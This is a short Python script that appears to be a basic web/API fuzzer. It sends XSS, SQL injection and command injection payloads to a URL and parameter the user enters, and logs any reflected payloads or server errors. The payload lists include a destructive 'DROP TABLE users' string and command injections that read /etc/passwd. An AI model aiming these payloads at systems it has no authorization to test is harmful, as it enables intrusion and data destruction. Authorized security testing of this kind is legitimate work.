import requests
import threading
from datetime import datetime

results = []

fuzz_payloads = {
    "general": [
        "", " ", "%%", "A" * 1000, "\0", "\n", "<>", "{}", "[]", "\"", "'", "`"
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=confirm(1)>"
    ],
    "sqli": [
        "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users; --", "' UNION SELECT NULL--"
    ],
    "cmdi": [
        "; ls -la", "&& whoami", "| cat /etc/passwd", "`id`", "$(sleep 5)"
    ]
}

def fuzz_param(url, param, method, category):
    payload_list = fuzz_payloads.get(category, fuzz_payloads["general"])

    for payload in payload_list:
        data = {param: payload}
        try:
            if method.upper() == "GET":
                resp = requests.get(url, params=data, timeout=10)
            else:
                resp = requests.post(url, data=data, timeout=10)

            reflected = payload in resp.text
            error = resp.status_code >= 500

            if reflected or error:
                results.append({
                    "url": url,
                    "method": method,
                    "param": param,
                    "payload": payload,
                    "reflected": reflected,
                    "error_code": resp.status_code if error else None,
                    "timestamp": datetime.utcnow().isoformat()
                })

        except Exception as e:
            results.append({
                "url": url,
                "method": method,
                "param": param,
                "payload": payload,
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat()
            })

def run_api_fuzzer():
    print("\n--- API Fuzzer ---")
    url = input("Target URL: ").strip()
    param = input("Parameter to fuzz (e.g., q): ").strip()
    method = input("HTTP method [GET/POST]: ").strip().upper()
    print("Fuzzing Categories: [1] General [2] XSS [3] SQLi [4] Command Injection")
    choice = input("Select category: ").strip()

    category_map = {"1": "general", "2": "xss", "3": "sqli", "4": "cmdi"}
    category = category_map.get(choice, "general")

    print(f"\n[*] Fuzzing {url} with category: {category.upper()}...\n")

    t = threading.Thread(target=fuzz_param, args=(url, param, method, category))
    t.start()
    t.join()

    with open("api_fuzzer_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    print("[+] Fuzzing complete. Results saved to api_fuzzer_results.txt.")

